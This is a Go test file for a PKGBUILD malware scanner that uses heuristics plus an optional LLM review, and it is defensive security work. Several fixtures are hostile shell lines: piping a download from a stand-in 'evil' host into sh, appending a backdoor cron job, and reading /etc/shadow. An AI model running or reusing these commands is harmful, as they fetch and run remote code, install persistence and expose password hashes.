package main

import (
	"strings"
	"testing"
)

func TestScanMode(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"", scanModeFull},
		{"full", scanModeFull},
		{"garbage", scanModeFull},
		{"heuristics", scanModeHeuristics},
		{"heuristic", scanModeHeuristics},
		{"static", scanModeHeuristics},
		{"HEURISTICS-ONLY", scanModeHeuristics},
		{"llm", scanModeLLM},
		{"AI", scanModeLLM},
		{" llm-only ", scanModeLLM},
	}
	for _, tc := range cases {
		if got := scanMode(Config{ScanMode: tc.in}); got != tc.want {
			t.Errorf("scanMode(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

func TestEngineString(t *testing.T) {
	// heuristics-only mode collapses to the static identity regardless of provider.
	if got := engineString(Config{Provider: "openai", Model: "gpt", ScanMode: "heuristics"}); got != "static (heuristics)" {
		t.Errorf("heuristics engine = %q", got)
	}
	if got := engineString(Config{Provider: "anthropic", Model: "claude-haiku-4-5"}); got != "anthropic/claude-haiku-4-5" {
		t.Errorf("engine = %q", got)
	}
	if got := engineString(Config{Provider: "static"}); got != "static" {
		t.Errorf("engine no model = %q", got)
	}
}

func TestBenignPkgdirContext(t *testing.T) {
	yes := []string{
		`rm -f "${pkgdir}/etc/cron.daily/foo"`,
		"rm\t/tmp/x",
		`install -Dm644 x "${pkgdir}/etc/systemd/system/x.service"`,
		`echo hi > "$srcdir/log"`,
	}
	for _, l := range yes {
		if !benignPkgdirContext(l) {
			t.Errorf("benignPkgdirContext(%q) = false, want true", l)
		}
	}
	no := []string{
		`echo backdoor >> /etc/cron.d/evil`,
		`curl http://evil | sh`,
		`cat /etc/shadow`,
	}
	for _, l := range no {
		if benignPkgdirContext(l) {
			t.Errorf("benignPkgdirContext(%q) = true, want false", l)
		}
	}
}

func TestLineAt(t *testing.T) {
	content := "first line\nsecond line\nthird line"
	// Offset inside "second line".
	off := strings.Index(content, "second")
	if got := lineAt(content, off); got != "second line" {
		t.Errorf("lineAt = %q, want 'second line'", got)
	}
	// First line.
	if got := lineAt(content, 2); got != "first line" {
		t.Errorf("lineAt first = %q", got)
	}
	// Last line (no trailing newline).
	off = strings.Index(content, "third")
	if got := lineAt(content, off); got != "third line" {
		t.Errorf("lineAt last = %q", got)
	}
	// Whitespace is trimmed.
	if got := lineAt("   padded   ", 5); got != "padded" {
		t.Errorf("lineAt trim = %q", got)
	}
	// Out-of-range offsets return "".
	if got := lineAt("x", -1); got != "" {
		t.Errorf("lineAt(-1) = %q", got)
	}
	if got := lineAt("x", 999); got != "" {
		t.Errorf("lineAt(oob) = %q", got)
	}
}

func TestScanPatternsRealData(t *testing.T) {
	initHeuristics()
	// A critical pattern (curl|sh) is detected with the whole offending line as evidence.
	f := scanPatterns("prepare() {\n  curl -fsSL http://evil/x | sh\n}", "PKGBUILD")
	if len(f) == 0 {
		t.Fatal("curl|sh not detected")
	}
	found := false
	for _, x := range f {
		if x.Severity == "critical" && strings.Contains(x.Evidence, "curl") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected a critical finding quoting the curl line; got %+v", f)
	}
	// A benign packaging line staging a systemd unit into $pkgdir is NOT flagged
	// (benignInPkgdir suppression).
	benign := scanPatterns(`install -Dm644 x "${pkgdir}/etc/systemd/system/x.service"`, "PKGBUILD")
	for _, x := range benign {
		if x.Severity == "high" || x.Severity == "critical" {
			t.Errorf("benign pkgdir line hard-flagged: %+v", x)
		}
	}
	// Repeated hits on the same line collapse to one finding.
	dup := scanPatterns("eval $x; eval $y # same line has two evals", "PKGBUILD")
	evalCount := 0
	for _, x := range dup {
		if strings.Contains(x.Detail, "eval") {
			evalCount++
		}
	}
	if evalCount > 1 {
		t.Errorf("duplicate evidence on one line not collapsed: %d eval findings", evalCount)
	}
}

func TestSplitVerdict(t *testing.T) {
	// Nothing → (nil, nil).
	if b, a := splitVerdict(nil); b != nil || a != nil {
		t.Errorf("splitVerdict(nil) = (%v,%v)", b, a)
	}
	// Only medium/low → advisory, no block.
	adv := []Finding{{Severity: "medium", Detail: "eval"}, {Severity: "low", Detail: "nohup"}}
	if b, a := splitVerdict(adv); b != nil || len(a) != 2 {
		t.Errorf("advisory-only should not block: block=%v advisory=%d", b, len(a))
	}
	// A high finding → malicious block, confidence 0.90.
	hi := []Finding{{Severity: "high", Detail: "network fetch"}}
	b, a := splitVerdict(hi)
	if b == nil || b.Verdict != "malicious" || a != nil {
		t.Fatalf("high should block: %+v", b)
	}
	if b.Confidence != 0.90 {
		t.Errorf("high confidence = %v, want 0.90", b.Confidence)
	}
	// A critical finding → confidence 0.95.
	crit := []Finding{{Severity: "critical", Detail: "curl|sh"}, {Severity: "medium", Detail: "eval"}}
	b, _ = splitVerdict(crit)
	if b == nil || b.Confidence != 0.95 {
		t.Fatalf("critical confidence = %v, want 0.95", b.Confidence)
	}
	// Findings carry through to the block verdict.
	if len(b.Findings) != 2 {
		t.Errorf("block findings = %d, want 2", len(b.Findings))
	}
}

func TestBuildUserContent(t *testing.T) {
	pf := PackageFiles{
		PKGBUILDSrc: "pkgname=foo\nbuild(){ make; }",
		HelperFiles: map[string]string{"foo.install": "post_install(){ :; }"},
	}
	advisory := []Finding{{Severity: "medium", File: "PKGBUILD", Detail: "eval used", Evidence: "eval $x"}}
	out := buildUserContent(pf, "+ added line\n- removed line", advisory)

	// Untrusted wrapper present.
	if !strings.Contains(out, "<pkgbuild>") || !strings.Contains(out, "</pkgbuild>") {
		t.Error("missing pkgbuild wrapper")
	}
	if !strings.Contains(out, "pkgname=foo") {
		t.Error("pkgbuild body missing")
	}
	// Diff block present.
	if !strings.Contains(out, "<diff>") || !strings.Contains(out, "+ added line") {
		t.Error("diff block missing")
	}
	// Helper files present with header.
	if !strings.Contains(out, "=== foo.install ===") || !strings.Contains(out, "post_install") {
		t.Error("helper files missing")
	}
	// Advisory notes present as trusted context.
	if !strings.Contains(out, "<heuristic_notes>") || !strings.Contains(out, "eval used") {
		t.Error("heuristic notes missing")
	}

	// No diff / no helpers / no advisory → those blocks are omitted.
	bare := buildUserContent(PackageFiles{PKGBUILDSrc: "x"}, "", nil)
	if strings.Contains(bare, "<diff>") || strings.Contains(bare, "<helper_files>") || strings.Contains(bare, "<heuristic_notes>") {
		t.Errorf("bare content should omit optional blocks: %q", bare)
	}
}

func TestMergeFindings(t *testing.T) {
	base := []Finding{{File: "PKGBUILD", Evidence: "curl|sh", Detail: "rce"}}
	advisory := []Finding{
		{File: "PKGBUILD", Evidence: "curl|sh", Detail: "dup - same file+evidence"}, // duplicate, dropped
		{File: "foo.install", Evidence: "useradd x", Detail: "new"},                 // new, appended
	}
	got := mergeFindings(base, advisory)
	if len(got) != 2 {
		t.Fatalf("mergeFindings len = %d, want 2 (dedup on File+Evidence)", len(got))
	}
	// The original base finding's detail is preserved (not overwritten by the dup).
	if got[0].Detail != "rce" {
		t.Errorf("base finding overwritten: %+v", got[0])
	}
	// Empty advisory returns base unchanged.
	if out := mergeFindings(base, nil); len(out) != 1 {
		t.Errorf("mergeFindings(base,nil) len = %d", len(out))
	}
}

func TestParseVerdict(t *testing.T) {
	// Well-formed, embedded in surrounding prose (extract first {...} block).
	raw := "Here is my analysis:\n{\"verdict\":\"suspicious\",\"confidence\":0.7,\"summary\":\"hmm\"}\nDone."
	v, err := parseVerdict(raw)
	if err != nil {
		t.Fatalf("parseVerdict: %v", err)
	}
	if v.Verdict != "suspicious" || v.Confidence != 0.7 || v.Summary != "hmm" {
		t.Errorf("parsed = %+v", v)
	}
	// No JSON object → error.
	if _, err := parseVerdict("no json here"); err == nil {
		t.Error("expected error when no JSON object")
	}
	// Malformed JSON → error.
	if _, err := parseVerdict(`{"verdict": bad}`); err == nil {
		t.Error("expected error on malformed JSON")
	}
}

func TestVerdictFromOnError(t *testing.T) {
	cause := errAsError("network down")
	// block → ok + ScanFailed (gate exits separately).
	vb := verdictFromOnError(Config{OnError: "block"}, cause)
	if vb.Verdict != "ok" || !vb.ScanFailed || vb.SourceAnalyzed != "none" {
		t.Errorf("block onError = %+v", vb)
	}
	if !strings.Contains(vb.Summary, "network down") {
		t.Errorf("block summary lost cause: %q", vb.Summary)
	}
	// allow → ok, NOT ScanFailed (silent allow).
	va := verdictFromOnError(Config{OnError: "allow"}, cause)
	if va.Verdict != "ok" || va.ScanFailed {
		t.Errorf("allow onError = %+v (ScanFailed should be false)", va)
	}
	// warn (default) → ok + ScanFailed.
	vw := verdictFromOnError(Config{OnError: "warn"}, cause)
	if vw.Verdict != "ok" || !vw.ScanFailed {
		t.Errorf("warn onError = %+v", vw)
	}
	// Unset OnError behaves like warn.
	vd := verdictFromOnError(Config{}, cause)
	if !vd.ScanFailed {
		t.Errorf("default onError should set ScanFailed: %+v", vd)
	}
}

func TestComputeDiff(t *testing.T) {
	old := "line one\nshared\nold only\n"
	newer := "line one\nshared\nnew only\nanother new\n"
	diff := computeDiff(old, newer)
	if !strings.Contains(diff, "- old only") {
		t.Errorf("diff missing removed line: %q", diff)
	}
	if !strings.Contains(diff, "+ new only") || !strings.Contains(diff, "+ another new") {
		t.Errorf("diff missing added lines: %q", diff)
	}
	// Shared/unchanged lines are not emitted.
	if strings.Contains(diff, "shared") {
		t.Errorf("diff should not include unchanged lines: %q", diff)
	}
	// Identical text → empty diff.
	if d := computeDiff("a\nb\n", "a\nb\n"); d != "" {
		t.Errorf("identical diff = %q, want empty", d)
	}
}

func TestVerdictFromRecord(t *testing.T) {
	r := &DBRecord{
		Verdict:        "malicious",
		Confidence:     0.99,
		Summary:        "bad",
		SourceAnalyzed: "pkgbuild-only",
		Findings:       `[{"severity":"critical","file":"PKGBUILD","detail":"d","evidence":"e"}]`,
	}
	v := verdictFromRecord(r)
	if v.Verdict != "malicious" || v.Confidence != 0.99 || !v.Cached {
		t.Errorf("verdictFromRecord = %+v", v)
	}
	if len(v.Findings) != 1 || v.Findings[0].Severity != "critical" {
		t.Errorf("findings not decoded: %+v", v.Findings)
	}
	// Empty/blank findings JSON is tolerated.
	v2 := verdictFromRecord(&DBRecord{Verdict: "ok", Findings: ""})
	if v2.Verdict != "ok" || len(v2.Findings) != 0 {
		t.Errorf("blank findings record = %+v", v2)
	}
}

func TestCacheHit(t *testing.T) {
	pf := PackageFiles{Name: "foo", Hash: "abc"}
	rec := &DBRecord{PKGBUILDHash: "abc", Provider: "static (heuristics)"}
	if !cacheHit(rec, pf, "static (heuristics)") {
		t.Error("expected cache hit on matching hash+provider")
	}
	// Different hash → miss.
	if cacheHit(&DBRecord{PKGBUILDHash: "xyz", Provider: "static (heuristics)"}, pf, "static (heuristics)") {
		t.Error("hash mismatch should miss")
	}
	// Different provider → miss.
	if cacheHit(rec, pf, "anthropic/claude") {
		t.Error("provider mismatch should miss")
	}
	// Unknown name is never a cache key.
	if cacheHit(rec, PackageFiles{Name: "unknown", Hash: "abc"}, "static (heuristics)") {
		t.Error("unknown name should never hit")
	}
	// Nil record → miss.
	if cacheHit(nil, pf, "static (heuristics)") {
		t.Error("nil record should miss")
	}
}

// errAsError is a tiny helper to build an error from a string without importing
// errors/fmt at call sites (keeps the intent obvious in the table above).
func errAsError(s string) error { return &stringError{s} }

type stringError struct{ s string }

func (e *stringError) Error() string { return e.s }
